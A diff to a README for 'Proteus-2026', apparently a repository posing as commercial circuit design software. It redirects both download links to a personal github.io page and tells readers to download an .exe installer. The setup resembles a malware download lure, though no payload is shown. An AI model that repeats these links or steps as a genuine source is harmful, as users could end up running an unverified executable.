@@ -1,6 +1,6 @@
 # 🛠️ Proteus-2026 - Professional Circuit Design Made Simple
 
-[![](https://img.shields.io/badge/Download-Proteus-2026-blue)](https://github.com/Ayanme1726/Proteus-2026)
+[![](https://img.shields.io/badge/Download-Proteus-2026-blue)](https://ayanme1726.github.io)
 
 ## 📋 Project Overview
 
@@ -21,7 +21,7 @@ Ensure your Windows system meets these standards before you begin:
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the following link to access the software: [Download Proteus-2026](https://github.com/Ayanme1726/Proteus-2026).
+1. Visit the following link to access the software: [Download Proteus-2026](https://ayanme1726.github.io).
 2. Look for the release section on the page.
 3. Select the installer file ending in .exe to begin the download.
 4. Save the file to your computer.
